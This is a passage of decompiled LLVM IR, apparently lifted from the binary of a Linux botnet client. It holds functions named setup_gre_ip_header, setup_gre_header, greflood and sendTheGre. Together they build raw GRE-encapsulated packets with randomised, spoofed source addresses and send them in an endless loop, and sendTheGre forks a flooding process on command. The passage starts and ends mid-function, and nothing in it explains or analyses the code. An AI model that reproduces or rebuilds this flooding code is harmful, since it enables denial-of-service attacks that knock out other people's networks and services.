  %v3_804bfe7 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806a190.110, i32 0, i32 0))
  store i8* %v4_804bfa0, i8** %stack_var_-172, align 4
  %v2_804bff2 = call i32 @close(i32 %v5_804bef4)
  %v3_804bff7 = load i32, i32* %stack_var_-96, align 4
  %v4_804bffa = inttoptr i32 %v3_804bff7 to i8*
  store i8* %v4_804bffa, i8** %stack_var_-172, align 4
  %v2_804bffd = call i32 @freeaddrinfo(i32 %v3_804bff7)
  br label %dec_label_pc_804c03b

dec_label_pc_804c004:                             ; preds = %dec_label_pc_804bf73
  %v7_804c008 = icmp sgt i32 %stack_var_-32.0.ph, 99
  br i1 %v7_804c008, label %dec_label_pc_804c00a, label %dec_label_pc_804c033

dec_label_pc_804c00a:                             ; preds = %dec_label_pc_804c004
  store i8* null, i8** %stack_var_-172, align 4
  %v3_804c011 = call i32 @__GI_time(i32* null)
  %v5_804c01e = icmp slt i32 %v3_804c011, %v5_804c019
  br i1 %v5_804c01e, label %dec_label_pc_804c033, label %dec_label_pc_804c020

dec_label_pc_804c020:                             ; preds = %dec_label_pc_804c00a
  store i8* null, i8** %stack_var_-172, align 4
  %v2_804c027 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804c033

dec_label_pc_804c033:                             ; preds = %dec_label_pc_804c020, %dec_label_pc_804c00a, %dec_label_pc_804c004
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804c004 ], [ 0, %dec_label_pc_804c00a ], [ 0, %dec_label_pc_804c020 ]
  %v4_804c033 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_804bf52.outer

dec_label_pc_804c03b:                             ; preds = %entry, %dec_label_pc_804bfe0
  %v0_804c045 = phi i32 [ %v2_804be02, %entry ], [ %v2_804bffd, %dec_label_pc_804bfe0 ]
  ret i32 %v0_804c045

; uselistorder directives
  uselistorder i32 %v5_804bf6a, { 1, 0 }
  uselistorder i32 %stack_var_-32.0.ph, { 1, 0 }
  uselistorder i32 %v5_804bef4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v4_804be40, { 1, 0 }
  uselistorder i32 %v2_804bdd4, { 1, 0, 2 }
  uselistorder i8** %stack_var_-172, { 19, 18, 17, 16, 15, 14, 20, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804c03b, { 1, 0 }
  uselistorder label %dec_label_pc_804bf5b, { 1, 0 }
  uselistorder label %dec_label_pc_804bf52, { 1, 0 }
  uselistorder label %dec_label_pc_804bf1a, { 1, 0 }
  uselistorder label %dec_label_pc_804bedd, { 1, 0 }
  uselistorder label %dec_label_pc_804be6c, { 1, 0 }
  uselistorder label %dec_label_pc_804be40, { 1, 0 }
}

define i32 @setup_gre_ip_header(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804c049 = load i32, i32* @edi, align 4
  %v0_804c04a = load i32, i32* @esi, align 4
  %v0_804c04b = load i32, i32* @ebx, align 4
  store i32 21, i32* @global_var_807f350.111, align 16
  store i8 69, i8* inttoptr (i32 1 to i8*), align 1
  store i8 0, i8* inttoptr (i32 2 to i8*), align 2
  %v2_804c0a3 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c0a3, i32* @edi, align 4
  %v2_804c0b9 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c0b9, i32* @ebx, align 4
  %v2_804c0cf = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c0cf, i32* @esi, align 4
  %v2_804c0e5 = call i32 @realrand(i32 1, i32 255)
  %v0_804c0ea = load i32, i32* @edi, align 4
  %v0_804c0ee = load i32, i32* @ebx, align 4
  %v0_804c0f2 = load i32, i32* @esi, align 4
  %v8_804c111 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_807f320.113 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_806a197.112 to i32), i32 %v2_804c0e5, i32 %v0_804c0f2, i32 %v0_804c0ee, i32 %v0_804c0ea)
  %v2_804c125 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c125, i32* @edi, align 4
  %v2_804c13b = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c13b, i32* @ebx, align 4
  %v2_804c151 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c151, i32* @esi, align 4
  %v2_804c167 = call i32 @realrand(i32 1, i32 255)
  %v0_804c16c = load i32, i32* @edi, align 4
  %v0_804c170 = load i32, i32* @ebx, align 4
  %v0_804c174 = load i32, i32* @esi, align 4
  %v8_804c193 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_807e1bc.114 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_806a197.112 to i32), i32 %v2_804c167, i32 %v0_804c174, i32 %v0_804c170, i32 %v0_804c16c)
  %v2_804c1a7 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c1a7, i32* @edi, align 4
  %v2_804c1bd = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c1bd, i32* @ebx, align 4
  %v2_804c1d3 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c1d3, i32* @esi, align 4
  %v2_804c1e9 = call i32 @realrand(i32 1, i32 255)
  %v0_804c1ee = load i32, i32* @edi, align 4
  %v0_804c1f2 = load i32, i32* @ebx, align 4
  %v0_804c1f6 = load i32, i32* @esi, align 4
  %v8_804c215 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_807f304.115 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_806a197.112 to i32), i32 %v2_804c1e9, i32 %v0_804c1f6, i32 %v0_804c1f2, i32 %v0_804c1ee)
  %v2_804c229 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c229, i32* @edi, align 4
  %v2_804c23f = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c23f, i32* @ebx, align 4
  %v2_804c255 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c255, i32* @esi, align 4
  %v2_804c26b = call i32 @realrand(i32 1, i32 255)
  %v0_804c270 = load i32, i32* @edi, align 4
  %v0_804c274 = load i32, i32* @ebx, align 4
  %v0_804c278 = load i32, i32* @esi, align 4
  %v8_804c297 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_807f338.116 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_806a197.112 to i32), i32 %v2_804c26b, i32 %v0_804c278, i32 %v0_804c274, i32 %v0_804c270)
  %v2_804c2a3 = call i32 @htons(i16 73)
  %v1_804c2ae = trunc i32 %v2_804c2a3 to i16
  store i16 %v1_804c2ae, i16* inttoptr (i32 3 to i16*), align 2
  %v2_804c2b9 = call i32 @htons(i16 -1)
  %v1_804c2c4 = trunc i32 %v2_804c2b9 to i16
  store i16 %v1_804c2c4, i16* inttoptr (i32 5 to i16*), align 2
  store i8 64, i8* inttoptr (i32 9 to i8*), align 1
  %v2_804c2d6 = call i32 @htons(i16 16384)
  %v1_804c2db = urem i32 %v2_804c2d6, 65536
  store i32 %v1_804c2db, i32* @edx, align 4
  %v1_804c2e1 = trunc i32 %v2_804c2d6 to i16
  store i16 %v1_804c2e1, i16* inttoptr (i32 7 to i16*), align 2
  store i8 47, i8* inttoptr (i32 10 to i8*), align 2
  %v1_804c2f3 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_807f320.113 to i32))
  store i32 %v1_804c2f3, i32* @edx, align 4
  store i32 %v1_804c2f3, i32* inttoptr (i32 13 to i32*), align 4
  %v1_804c307 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_807e1bc.114 to i32))
  store i32 %v1_804c307, i32* inttoptr (i32 17 to i32*), align 4
  %v0_804c314 = load i32, i32* @global_var_807f350.111, align 16
  store i32 %v0_804c314, i32* @ebx, align 4
  %v2_804c321 = call i32 @htons(i16 2)
  %v1_804c329 = trunc i32 %v2_804c321 to i16
  %v2_804c329 = load i32, i32* @ebx, align 4
  %v3_804c329 = add i32 %v2_804c329, 2
  %v4_804c329 = inttoptr i32 %v3_804c329 to i16*
  store i16 %v1_804c329, i16* %v4_804c329, align 2
  store i8 69, i8* inttoptr (i32 25 to i8*), align 1
  store i8 0, i8* inttoptr (i32 26 to i8*), align 2
  %v2_804c353 = call i32 @htons(i16 540)
  %v1_804c35e = trunc i32 %v2_804c353 to i16
  store i16 %v1_804c35e, i16* inttoptr (i32 27 to i16*), align 2
  %v2_804c369 = call i32 @htons(i16 0)
  %v1_804c374 = trunc i32 %v2_804c369 to i16
  store i16 %v1_804c374, i16* inttoptr (i32 29 to i16*), align 2
  store i8 64, i8* inttoptr (i32 33 to i8*), align 1
  %v2_804c386 = call i32 @htons(i16 16384)
  %v1_804c38b = urem i32 %v2_804c386, 65536
  store i32 %v1_804c38b, i32* @edx, align 4
  %v1_804c391 = trunc i32 %v2_804c386 to i16
  store i16 %v1_804c391, i16* inttoptr (i32 31 to i16*), align 2
  store i8 17, i8* inttoptr (i32 34 to i8*), align 2
  %v1_804c3a3 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_807f304.115 to i32))
  store i32 %v1_804c3a3, i32* @edx, align 4
  store i32 %v1_804c3a3, i32* inttoptr (i32 37 to i32*), align 4
  %v1_804c3b7 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_807f338.116 to i32))
  store i32 %v1_804c3b7, i32* inttoptr (i32 41 to i32*), align 4
  store i32 %v0_804c04b, i32* @ebx, align 4
  store i32 %v0_804c04a, i32* @esi, align 4
  store i32 %v0_804c049, i32* @edi, align 4
  ret i32 25

; uselistorder directives
  uselistorder i32 %v2_804c386, { 1, 0 }
  uselistorder i32 %v2_804c2d6, { 1, 0 }
}

define i32 @setup_gre_header(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804c3cc = load i32, i32* @ebp, align 4
  store i32 %v0_804c3cc, i32* %stack_var_-4, align 4
  %v4_804c3cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804c3cc, i32* @ebp, align 4
  %v2_804c3e1 = call i32 @realrand(i32 1, i32 99999)
  %v1_804c3ec = trunc i32 %v2_804c3e1 to i16
  %v2_804c3ec = call i32 @htons(i16 %v1_804c3ec)
  %v4_804c3f4 = ptrtoint i16* %arg1 to i32
  %v1_804c3f7 = trunc i32 %v2_804c3ec to i16
  store i16 %v1_804c3f7, i16* %arg1, align 2
  %v2_804c409 = call i32 @realrand(i32 1, i32 255)
  %v1_804c414 = trunc i32 %v2_804c409 to i16
  %v2_804c414 = call i32 @htons(i16 %v1_804c414)
  %v1_804c41f = trunc i32 %v2_804c414 to i16
  %v3_804c41f = add i32 %v4_804c3f4, 2
  %v4_804c41f = inttoptr i32 %v3_804c41f to i16*
  store i16 %v1_804c41f, i16* %v4_804c41f, align 2
  %v1_804c426 = add i32 %v4_804c3f4, 6
  %v2_804c426 = inttoptr i32 %v1_804c426 to i16*
  store i16 0, i16* %v2_804c426, align 2
  %v1_804c42f = add i32 %v4_804c3f4, 8
  %v1_804c438 = inttoptr i32 %v1_804c42f to i32*
  store i32 -1, i32* %v1_804c438, align 4
  %v1_804c441 = add i32 %v4_804c3f4, 12
  %v1_804c444 = inttoptr i32 %v1_804c441 to i16*
  store i16 11, i16* %v1_804c444, align 2
  %v2_804c450 = call i32 @htons(i16 520)
  %v1_804c45b = trunc i32 %v2_804c450 to i16
  %v4_804c45b = add i32 %v4_804c3f4, 4
  %v5_804c45b = inttoptr i32 %v4_804c45b to i16*
  store i16 %v1_804c45b, i16* %v5_804c45b, align 2
  %v2_804c45f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c45f, i32* @ebp, align 4
  ret i32 %v4_804c3f4

; uselistorder directives
  uselistorder i32 %v4_804c3f4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @greflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4148 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %v2_804c471 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_804c47d = add i32 %v2_804c471, 20
  %v1_804c486 = add i32 %arg1, 8
  %v2_804c486 = inttoptr i32 %v1_804c486 to i32*
  %v3_804c486 = load i32, i32* %v2_804c486, align 4
  store i32 %v3_804c486, i32* %stack_var_-4144, align 4
  %v1_804c48f = add i32 %arg1, 12
  %v2_804c48f = inttoptr i32 %v1_804c48f to i32*
  %v3_804c48f = load i32, i32* %v2_804c48f, align 4
  store i32 2, i32* %stack_var_-4188, align 4
  %v3_804c4c1 = call i32 @socket(i32 2, i32 3, i32 17)
  %v5_804c4c9 = icmp slt i32 %v3_804c4c1, 0
  %v1_804c4cd = icmp eq i1 %v5_804c4c9, false
  br i1 %v1_804c4cd, label %dec_label_pc_804c4db, label %dec_label_pc_804c4cf

dec_label_pc_804c4cf:                             ; preds = %entry
  store i32 -1, i32* %stack_var_-4188, align 4
  %v1_804c4d6 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804c4db

dec_label_pc_804c4db:                             ; preds = %entry, %dec_label_pc_804c4cf
  store i32 %v2_804c471, i32* %stack_var_-4188, align 4
  %v3_804c500 = bitcast i32* %stack_var_-4128 to i8*
  %v4_804c500 = call i32 @__GI_memset(i8* %v3_804c500, i32 0, i32 4096)
  store i32 %v2_804c471, i32* %stack_var_-4188, align 4
  %v1_804c50b = call i32 @setup_gre_ip_header(i32 %v2_804c471)
  store i32 %v1_804c47d, i32* %stack_var_-4188, align 4
  %v1_804c516 = inttoptr i32 %v1_804c47d to i16*
  %v2_804c516 = call i32 @setup_gre_header(i16* %v1_804c516)
  %v2_804c524 = add i32 %v2_804c471, 16
  %v3_804c524 = inttoptr i32 %v2_804c524 to i32*
  store i32 %v3_804c48f, i32* %v3_804c524, align 4
  %v1_804c52a = or i32 %v2_804c471, 2
  %v2_804c52a = inttoptr i32 %v1_804c52a to i16*
  %v3_804c52a = load i16, i16* %v2_804c52a, align 2
  %v4_804c52a = zext i16 %v3_804c52a to i32
  store i32 %v2_804c471, i32* %stack_var_-4188, align 4
  %v2_804c53b = bitcast i32* %stack_var_-4128 to i16*
  %v3_804c53b = call i32 @csum(i16* %v2_804c53b, i32 %v4_804c52a)
  %v1_804c546 = trunc i32 %v3_804c53b to i16
  %v3_804c546 = add i32 %v2_804c471, 10
  %v4_804c546 = inttoptr i32 %v3_804c546 to i16*
  store i16 %v1_804c546, i16* %v4_804c546, align 2
  store i32 1, i32* %stack_var_-4148, align 4
  %v2_804c554 = ptrtoint i32* %stack_var_-4148 to i32
  store i32 %v3_804c4c1, i32* %stack_var_-4188, align 4
  %v5_804c582 = call i32 @__GI_setsockopt(i32 %v3_804c4c1, i32 0, i32 3, i32 %v2_804c554, i32 4)
  %v2_804c587 = icmp slt i32 %v5_804c582, 0
  %v1_804c589 = icmp eq i1 %v2_804c587, false
  br i1 %v1_804c589, label %dec_label_pc_804c597, label %dec_label_pc_804c58b

dec_label_pc_804c58b:                             ; preds = %dec_label_pc_804c4db
  store i32 -1, i32* %stack_var_-4188, align 4
  %v1_804c592 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804c597

dec_label_pc_804c597:                             ; preds = %dec_label_pc_804c4db, %dec_label_pc_804c58b
  store i32 0, i32* %stack_var_-4188, align 4
  %v2_804c59e = call i32 @__GI_time(i32* null)
  store i32 %v2_804c59e, i32* %stack_var_-4188, align 4
  %v1_804c5a6 = call i32 @init_rand(i32 %v2_804c59e)
  %v2_804c5b5 = ptrtoint i32* %stack_var_-4144 to i32
  %v2_804c636 = add i32 %v2_804c471, 12
  %v3_804c636 = inttoptr i32 %v2_804c636 to i32*
  %v3_804c64c = add i32 %v2_804c471, 4
  %v4_804c64c = inttoptr i32 %v3_804c64c to i16*
  br label %dec_label_pc_804c5b5

dec_label_pc_804c5b5:                             ; preds = %dec_label_pc_804c6a2, %dec_label_pc_804c597
  %storemerge = phi i32 [ %v4_804c6a2, %dec_label_pc_804c6a2 ], [ 0, %dec_label_pc_804c597 ]
  %v3_804c5be = load i16, i16* %v2_804c52a, align 2
  %v4_804c5be = zext i16 %v3_804c5be to i32
  store i32 %v3_804c4c1, i32* %stack_var_-4188, align 4
  %v6_804c5ea = call i32 @sendto(i32 %v3_804c4c1, i32 %v2_804c471, i32 %v4_804c5be, i32 0, i32 %v2_804c5b5, i32 16)
  %v1_804c5ef = call i32 @rand_cmwc(i32 %v3_804c4c1)
  %v2_804c5f4 = urem i32 %v1_804c5ef, 16777216
  %v2_804c5fe = sub i32 %v1_804c5ef, %v2_804c5f4
  store i32 %v2_804c5fe, i32* @ebx, align 4
  %v1_804c601 = call i32 @rand_cmwc(i32 %v3_804c4c1)
  %sext = mul i32 %v1_804c601, 65536
  %v1_804c606 = sdiv i32 %sext, 65536
  %v1_804c609 = and i32 %v1_804c606, 16711680
  %v0_804c611 = load i32, i32* @ebx, align 4
  %v2_804c611 = or i32 %v1_804c609, %v0_804c611
  store i32 %v2_804c611, i32* @ebx, align 4
  %v0_804c613 = load i32, i32* %stack_var_-4188, align 4
  %v1_804c613 = call i32 @rand_cmwc(i32 %v0_804c613)
  %sext1 = mul i32 %v1_804c613, 16777216
  %v1_804c618 = sdiv i32 %sext1, 16777216
  %v1_804c61b = and i32 %v1_804c618, 65280
  %v0_804c623 = load i32, i32* @ebx, align 4
  %v2_804c623 = or i32 %v1_804c61b, %v0_804c623
  store i32 %v2_804c623, i32* @ebx, align 4
  %v0_804c625 = load i32, i32* %stack_var_-4188, align 4
  %v1_804c625 = call i32 @rand_cmwc(i32 %v0_804c625)
  %v1_804c62a = urem i32 %v1_804c625, 256
  %v0_804c62f = load i32, i32* @ebx, align 4
  %v2_804c631 = or i32 %v0_804c62f, %v1_804c62a
  store i32 %v2_804c631, i32* %v3_804c636, align 4
  %v0_804c639 = load i32, i32* %stack_var_-4188, align 4
  %v1_804c639 = call i32 @rand_cmwc(i32 %v0_804c639)
  store i32 %v1_804c639, i32* %stack_var_-4188, align 4
  %v1_804c641 = call i32 @htonl(i32 %v1_804c639)
  %v1_804c64c = trunc i32 %v1_804c641 to i16
  store i16 %v1_804c64c, i16* %v4_804c64c, align 4
  %v3_804c653 = load i16, i16* %v2_804c52a, align 2
  %v4_804c653 = zext i16 %v3_804c653 to i32
  store i32 %v2_804c471, i32* %stack_var_-4188, align 4
  %v3_804c664 = call i32 @csum(i16* %v2_804c53b, i32 %v4_804c653)
  %v1_804c66f = trunc i32 %v3_804c664 to i16
  store i16 %v1_804c66f, i16* %v4_804c546, align 2
  %v0_804c673 = load i64, i64* @global_var_807e2e0.88, align 8
  %v1_804c673 = trunc i64 %v0_804c673 to i32
  %v1_804c678 = add i32 %v1_804c673, 1
  %v1_804c679 = sext i32 %v1_804c678 to i64
  store i64 %v1_804c679, i64* @global_var_807e2e0.88, align 32
  %v0_804c67e = load i32, i32* @global_var_807e1a8.89, align 8
  %v6_804c689 = icmp ugt i32 %v0_804c67e, %storemerge
  br i1 %v6_804c689, label %dec_label_pc_804c6a2, label %dec_label_pc_804c68b

dec_label_pc_804c68b:                             ; preds = %dec_label_pc_804c5b5
  %v0_804c695 = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804c695, i32* %stack_var_-4188, align 4
  %v1_804c69d = sext i32 %v0_804c695 to i64
  %v2_804c69d = call i32 @usleep(i64 %v1_804c69d)
  br label %dec_label_pc_804c6a2

dec_label_pc_804c6a2:                             ; preds = %dec_label_pc_804c5b5, %dec_label_pc_804c68b
  %stack_var_-4156.0 = phi i32 [ %storemerge, %dec_label_pc_804c5b5 ], [ 0, %dec_label_pc_804c68b ]
  %v4_804c6a2 = add i32 %stack_var_-4156.0, 1
  br label %dec_label_pc_804c5b5

; uselistorder directives
  uselistorder i32 %v3_804c4c1, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v1_804c47d, { 1, 0 }
  uselistorder i32 %v2_804c471, { 7, 8, 1, 2, 3, 9, 0, 4, 6, 5, 10, 11 }
  uselistorder i32* %stack_var_-4188, { 3, 4, 5, 2, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %stack_var_-4148, { 1, 0 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c6a2, { 1, 0 }
  uselistorder label %dec_label_pc_804c597, { 1, 0 }
  uselistorder label %dec_label_pc_804c4db, { 1, 0 }
}

define i32 @sendTheGre(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c6ad = load i32, i32* @ebp, align 4
  store i32 %v0_804c6ad, i32* %stack_var_-4, align 4
  %v4_804c6ad = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804c6ad, i32* @ebp, align 4
  %v15_804c6b0 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v15_804c6b0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-108, align 4
  %v2_804c6bf = call i32 @__GI_time(i32* null)
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-108, align 4
  %v1_804c6cd = call i32 @mfork(i32 %arg2)
  store i32 %v1_804c6cd, i32* %eax.global-to-local, align 4
  %v1_804c6d2 = icmp eq i32 %v1_804c6cd, 0
  %v1_804c6d4 = icmp eq i1 %v1_804c6d2, false
  br i1 %v1_804c6d4, label %dec_label_pc_804c9fc, label %dec_label_pc_804c6da

dec_label_pc_804c6da:                             ; preds = %entry
  store i32 2, i32* %stack_var_-108, align 4
  %v4_804c6f1 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v4_804c6f1, i32* %eax.global-to-local, align 4
  %v5_804c6f9 = icmp slt i32 %v4_804c6f1, 0
  %v1_804c6fd = icmp eq i1 %v5_804c6f9, false
  br i1 %v1_804c6fd, label %dec_label_pc_804c70b, label %dec_label_pc_804c6ff

dec_label_pc_804c6ff:                             ; preds = %dec_label_pc_804c6da
  store i32 1, i32* %stack_var_-108, align 4
  %v1_804c706 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804c706, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c70b

dec_label_pc_804c70b:                             ; preds = %dec_label_pc_804c6da, %dec_label_pc_804c6ff
  %v4_804c70b = add i32 %arg3, -4
  %v9_804c70b = sub i32 3, %arg3
  %v10_804c70b = and i32 %v9_804c70b, %arg3
  %v11_804c70b = icmp slt i32 %v10_804c70b, 0
  %v12_804c70b = icmp eq i32 %v4_804c70b, 0
  %v13_804c70b = icmp slt i32 %v4_804c70b, 0
  %v3_804c70f = icmp eq i1 %v13_804c70b, %v11_804c70b
  %v4_804c70f = icmp eq i1 %v12_804c70b, false
  %v5_804c70f = and i1 %v4_804c70f, %v3_804c70f
  br i1 %v5_804c70f, label %dec_label_pc_804c737, label %dec_label_pc_804c711

dec_label_pc_804c711:                             ; preds = %dec_label_pc_804c70b
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v3_804c726 = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_806a1a4.117 to i32))
  store i32 %v3_804c726, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-108, align 4
  %v1_804c732 = call i32 @__GI_exit(i32 -1)
  store i32 %v1_804c732, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c737

dec_label_pc_804c737:                             ; preds = %dec_label_pc_804c70b, %dec_label_pc_804c711
  %v1_804c73a = add i32 %arg4, 12
  store i32 %v1_804c73a, i32* %eax.global-to-local, align 4
  %v1_804c73d = inttoptr i32 %v1_804c73a to i32*
  %v2_804c73d = load i32, i32* %v1_804c73d, align 4
  store i32 %v2_804c73d, i32* %eax.global-to-local, align 4
  store i32 %v2_804c73d, i32* %stack_var_-108, align 4
  %v1_804c742 = call i32 @atol(i32 %v2_804c73d)
  %v1_804c74d = add i32 %arg4, 16
  store i32 %v1_804c74d, i32* %eax.global-to-local, align 4
  %v1_804c750 = inttoptr i32 %v1_804c74d to i32*
  %v2_804c750 = load i32, i32* %v1_804c750, align 4
  store i32 %v2_804c750, i32* %eax.global-to-local, align 4
  store i32 %v2_804c750, i32* %stack_var_-108, align 4
  %v1_804c755 = call i32 @atol(i32 %v2_804c750)
  %v1_804c760 = add i32 %arg4, 8
  store i32 %v1_804c760, i32* %eax.global-to-local, align 4
  %v1_804c763 = inttoptr i32 %v1_804c760 to i32*
  %v2_804c763 = load i32, i32* %v1_804c763, align 4
  store i32 %v2_804c763, i32* %eax.global-to-local, align 4
  store i32 %v2_804c763, i32* %stack_var_-108, align 4
  %v1_804c768 = call i32 @atol(i32 %v2_804c763)
  %v1_804c773 = add i32 %arg4, 20
  store i32 %v1_804c773, i32* %eax.global-to-local, align 4
  %v1_804c776 = inttoptr i32 %v1_804c773 to i32*
  %v2_804c776 = load i32, i32* %v1_804c776, align 4
  store i32 %v2_804c776, i32* %eax.global-to-local, align 4
  store i32 %v2_804c776, i32* %stack_var_-108, align 4
  %v1_804c77b = call i32 @atol(i32 %v2_804c776)
  store i32 0, i32* @global_var_807e1a8.89, align 8
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v2_804c79a = mul i32 %v1_804c742, 4
  %v1_804c7a0 = add i32 %v2_804c79a, 30
  %v2_804c7a3 = and i32 %v1_804c7a0, -16
  %v0_804c7a9 = load i32, i32* @esp, align 4
  %v2_804c7a9 = sub i32 %v0_804c7a9, %v2_804c7a3
  %v1_804c7b5 = add i32 %v2_804c7a9, 31
  %v2_804c7b8 = urem i32 %v1_804c7b5, 16
  %v2_804c7bb = sub i32 %v1_804c7b5, %v2_804c7b8
  %v1_804c7d0 = urem i32 %v1_804c768, 65536
  store i32 %v1_804c7d0, i32* %eax.global-to-local, align 4
  %v2_804c7d3 = inttoptr i32 %v2_804c7a9 to i32*
  store i32 %v1_804c7d0, i32* %v2_804c7d3, align 4
  %v1_804c7d6 = trunc i32 %v2_804c7bb to i16
  %v2_804c7d6 = call i32 @htons(i16 %v1_804c7d6)
  %v1_804c7e5 = add i32 %arg4, 4
  store i32 %v1_804c7e5, i32* %eax.global-to-local, align 4
  %v1_804c7e8 = inttoptr i32 %v1_804c7e5 to i32*
  %v2_804c7e8 = load i32, i32* %v1_804c7e8, align 4
  store i32 %v2_804c7e8, i32* %eax.global-to-local, align 4
  %v1_804c7ea = load i32, i32* @esp, align 4
  %v2_804c7ea = inttoptr i32 %v1_804c7ea to i32*
  store i32 %v2_804c7e8, i32* %v2_804c7ea, align 4
  %sext = mul i32 %v2_804c7d6, 65536
  %v1_804c7ed = sdiv i32 %sext, 65536
  %v2_804c7ed = call i32 @inet_addr(i32 %v1_804c7ed)
  store i32 %v1_804c742, i32* %edx.global-to-local, align 4
  %v2_804c800 = mul i32 %v1_804c742, 24
  %v1_804c806 = add i32 %v2_804c800, 30
  %v2_804c809 = and i32 %v1_804c806, -16
  %v0_804c80f = load i32, i32* @esp, align 4
  %v2_804c80f = sub i32 %v0_804c80f, %v2_804c809
  %v1_804c81b = add i32 %v2_804c80f, 31
  %v2_804c81e = and i32 %v1_804c81b, -16
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804c8e340 = icmp sgt i32 %v1_804c742, 0
  br i1 %v5_804c8e340, label %dec_label_pc_804c840.lr.ph, label %dec_label_pc_804c8e9

dec_label_pc_804c840.lr.ph:                       ; preds = %dec_label_pc_804c737
  %v3_804c86f = or i32 %v2_804c81e, 8
  br label %dec_label_pc_804c840

dec_label_pc_804c840:                             ; preds = %dec_label_pc_804c840, %dec_label_pc_804c840.lr.ph
  %storemerge41 = phi i32 [ 0, %dec_label_pc_804c840.lr.ph ], [ %v4_804c8da, %dec_label_pc_804c840 ]
  %v1_804c84c = mul i32 %storemerge41, 24
  %v3_804c856 = add i32 %v1_804c84c, %v2_804c81e
  %v4_804c856 = inttoptr i32 %v3_804c856 to i32*
  store i32 %storemerge41, i32* %v4_804c856, align 8
  store i32 %v2_804c81e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c84c, i32* %edx.global-to-local, align 4
  %v4_804c86f = add i32 %v3_804c86f, %v1_804c84c
  %v5_804c86f = inttoptr i32 %v4_804c86f to i32*
  store i32 2, i32* %v5_804c86f, align 8
  %v1_804c876 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c876 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c876 = add i32 %v1_804c876, 12
  %v4_804c876 = add i32 %v3_804c876, %v2_804c876
  %v5_804c876 = inttoptr i32 %v4_804c876 to i32*
  store i32 %v2_804c7ed, i32* %v5_804c876, align 4
  %v1_804c87d = load i32, i32* %edx.global-to-local, align 4
  %v2_804c87d = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c87d = add i32 %v1_804c87d, 16
  %v4_804c87d = add i32 %v3_804c87d, %v2_804c87d
  %v5_804c87d = inttoptr i32 %v4_804c87d to i32*
  %v1_804c884 = load i32, i32* %edx.global-to-local, align 4
